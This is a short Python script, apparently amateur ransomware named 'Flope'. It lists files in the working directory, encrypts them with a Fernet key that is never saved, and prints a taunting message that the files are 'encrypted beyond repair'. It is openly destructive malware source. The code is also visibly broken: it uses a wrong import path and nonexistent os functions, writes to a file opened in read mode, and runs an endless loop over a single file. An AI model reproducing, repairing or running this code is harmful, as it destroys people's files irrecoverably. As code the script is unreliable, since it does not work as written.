import os
from cryptography.Fernet import Fernet

files = []
key = Fernet.generate_key()

class fcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def showName():
 print(fcolors.WARNING + "___________.__                        ")
 print(fcolors.WARNING + "\_   _____/|  |   ____ ______   ____  ")
 print(fcolors.WARNING + " |    __)  |  |  /  _ \\____ \_/ __ \ ")
 print(fcolors.WARNING + " |     \   |  |_(  <_> )  |_> >  ___/ ")
 print(fcolors.WARNING + " \___  /   |____/\____/|   __/ \___  >")
 print(fcolors.WARNING + "     \/                |__|        \/ ")
 print(fcolors.OKCYAN + "The flop don't stop!")


for file in os.listdr():
  if file == "main.py" or file == "flope.key" or os.isdir(file):
    continue
  files.append(file)
showName()
print(fcolors.OKGREEN + 'Sorry, but your files have been encrypted beyond repair. Please get a good antivirus.')
while True:
  with open(file, "rb") as flile:
    flopData = flile.read()
  flopeData = Fernet(key).encrypt(flopData)
  with open(file, "rb") as flile:
    flile.write(flopeData)

